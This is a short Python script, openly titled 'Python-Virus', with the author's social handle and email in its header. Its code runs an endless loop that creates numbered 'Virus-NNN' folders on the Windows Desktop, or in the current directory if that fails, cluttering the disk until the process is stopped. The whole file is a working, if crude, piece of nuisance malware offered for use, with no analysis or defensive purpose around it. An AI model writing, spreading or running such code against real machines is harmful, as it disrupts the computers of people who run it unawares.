'''Python-Virus
Instagram: JoaoAssalim_
Email: assalim.py@gmail.com
GitHub Repo: https://github.com/JoaoAssalim/Python-Virus'''

import os

oldDirectory = os.getcwd()
direct = oldDirectory.split('\\')
newDirectory = f'{direct[0]}\\{direct[1]}\\{direct[2]}\\Desktop'
counter = 0

while True:
    counter += 1
    try:
        os.chdir(newDirectory)
        if counter < 10:
            os.mkdir(f'Virus-00{counter}')
        elif counter < 100:
            os.mkdir(f'Virus-0{counter}')
        else:
            os.mkdir(f'Virus-{counter}')

    except:
        os.chdir(oldDirectory)
        if counter < 10:
            os.mkdir(f'Virus-00{counter}')
        elif counter < 100:
            os.mkdir(f'Virus-0{counter}')
        else:
            os.mkdir(f'Virus-{counter}')
